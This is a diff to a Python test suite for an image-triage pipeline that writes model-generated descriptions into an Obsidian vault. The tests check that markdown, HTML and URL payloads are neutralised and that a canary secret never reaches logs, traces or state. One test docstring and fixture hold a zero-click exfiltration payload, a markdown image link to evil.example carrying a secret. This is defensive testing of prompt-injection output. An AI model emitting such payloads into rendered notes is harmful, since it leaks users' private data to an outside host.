@@ -621,9 +621,9 @@ def test_when_the_budget_is_used_up_before_the_first_image_the_notification_says
 
 
 def test_a_topic_with_markdown_html_or_a_url_never_reaches_the_triage_file_as_such(vault, pack_dir, overlay):
-    """Zero-click exfiltration: ``![](https://evil.example/c?d=secret)`` in a note makes Obsidian fetch it. The
-    output guard flags the blatant payload (the row is quarantined with an empty topic); what passes the guard
-    is neutralised on the write path."""
+    """Zero-click exfiltration: ``![](https://evil.example/c?d=secret)`` in a note makes Obsidian fetch
+    it. The output guard flags the blatant payload (the row is quarantined with an empty topic); what passes
+    the guard is neutralised on the write path."""
     s = script()
     s[digest("post.jpg")] = valid_description(topic="![](https://evil.example/c?d=secret)")
     s[digest("proj-page.png")] = valid_description(
@@ -636,3 +636,83 @@ def test_a_topic_with_markdown_html_or_a_url_never_reaches_the_triage_file_as_su
         assert bad not in text, bad
     soft = w.rows[rid("proj-page.png")]
     assert soft["needs_owner"] is False and soft["topic"].startswith("A page, see")  # kept, made inert
+
+
+# -- exception text can carry what the image says: private flows keep errors content-free -------------
+
+SECRET = "LEAK-CANARY-7f3a9c"
+
+
+def _openai_viewer(snap, tracer, text_model):
+    """The real OpenAI adapter on a mock server whose answer violates the schema with the secret as a value,
+    for images; text calls go to the scripted text model."""
+    import httpx
+
+    from pkpipe.adapters.model_openai import OpenAIModel
+
+    answer = {
+        "kind": SECRET,
+        "topic": "t",
+        "visible_text": SECRET,
+        "urls": [],
+        "language": "en",
+        "category_hint": "unknown",
+        "injection_suspected": False,
+        "evidence": None,
+    }
+
+    def handler(request):
+        return httpx.Response(
+            200,
+            json={
+                "choices": [{"message": {"content": json.dumps(answer)}, "finish_reason": "stop"}],
+                "usage": {},
+            },
+        )
+
+    real = OpenAIModel(
+        snap.data["models"],
+        environ={},
+        client=httpx.Client(transport=httpx.MockTransport(handler)),
+        tracer=tracer,
+    )
+
+    class Router:
+        def complete(self, system, user, json_schema=None, profile="default", images=None):
+            if images:
+                return real.complete(system, user, json_schema, profile=profile, images=images)
+            return text_model(system, user, json_schema)
+
+    return Router()
+
+
+def test_a_schema_violation_that_quotes_the_image_text_reaches_no_span_log_error_or_state(
+    vault, pack_dir, overlay, otel, caplog
+):
+    from pkpipe.adapters.tracer_otel import OtelTracer
+
+    caplog.set_level(logging.DEBUG)
+    w = World(vault, pack_dir, overlay, tracer=OtelTracer())
+    w.ports.model = _openai_viewer(w.snap, otel.telemetry.tracer, w.model.text)
+    run = w.svc.start("triage")
+    assert run.ok, run.error
+    assert w.rows[rid("proj-page.png")]["needs_owner"] is True  # the schema violation failed the image
+    spans = json.dumps(
+        [
+            {
+                "name": s.name,
+                "attributes": dict(s.attributes),
+                "status": [str(s.status.status_code), s.status.description],
+                "events": [(e.name, dict(e.attributes)) for e in s.events],
+            }
+            for s in otel.spans()
+        ],
+        default=str,
+    )
+    state = json.dumps(run.state, default=str)
+    record = json.dumps(run.run.record(), default=str)
+    for where, text in (("spans", spans), ("state", state), ("run record", record), ("logs", caplog.text)):
+        assert SECRET not in text, where
+    assert (
+        "SchemaError" in w.rows[rid("proj-page.png")]["topic"]
+    )  # the type stays: the reason code of the row
